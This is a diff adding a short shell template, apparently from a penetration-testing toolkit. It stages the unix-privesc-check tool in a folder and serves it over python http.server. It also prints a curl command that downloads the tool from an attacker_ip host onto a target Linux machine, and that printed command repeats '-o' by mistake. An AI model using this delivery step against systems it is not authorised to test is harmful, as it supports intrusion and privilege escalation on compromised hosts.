@@ -1,0 +1,6 @@
+mkdir -p packstation/outbound; cp -n /usr/bin/unix-privesc-check packstation/outbound; \
+echo '================================================================'; \
+echo '                       -----Linux------                         '; \
+echo 'Deliver only: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/unix-privesc-check -o -o <%=$(esh variables/delivery_path_linux)%>/unix-privesc-check'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
